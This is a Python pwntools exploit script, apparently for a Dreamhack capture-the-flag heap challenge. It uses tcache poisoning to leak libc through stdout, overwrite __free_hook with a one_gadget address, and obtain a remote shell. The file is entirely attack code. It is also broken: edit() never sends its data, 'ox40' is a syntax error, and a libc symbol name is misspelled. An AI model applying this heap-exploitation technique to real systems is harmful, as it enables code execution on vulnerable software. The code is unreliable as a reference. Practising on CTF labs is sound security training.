from pwn import *

p = remote("host3.dreamhack.games", 23346)
e = ELF("./tcache_poison")
libc = ELF("./libc-2.27.so")

def slog(symbol, addr):
    return success(symbol + ": " + hex(addr))

def alloc(size, data):
    p.sendlineafter("Edit\n", "0x31")
    p.sendlineafter(":", str(size))
    p.sendafter(":", data)

def free():
    p.sendlineafter("Edit\n", "0x32")

def print_chunk():
    p.sendlineafter("Edit\n", "0x33")

def edit(data):
    p.sendlineafter("Edit\n", "0x34")

alloc(0x30, "dreamhack")
free()

edit("A" * 8 + "\x00")
free()

addr_stdout = e.symbols["stdout"]
alloc(0x30, p64(addr_stdout))

alloc(0x30, "BBBBBBBB")
alloc(0x30, "0x60")

print_chunk()
p.recvuntil("Content: ")
stdout = u64(p.recv(6).ljust(8, b"\x00"))
lb = stdout - libc.symbols["_l0_2_1_stdout_"]
fh = lb + libc.symbols["__free_hook"]
og = lb + 0x4f432

slog("free_hook", fh)
slog("one_gadget", og)

alloc(0x40, "dreamhack")
free()

edit("C" * 8 + "\x00")
free()

alloc(0x40, p64(fh))
alloc(ox40, "D" * 8)
alloc(0x50, p64(og))

free()

p.interactive()

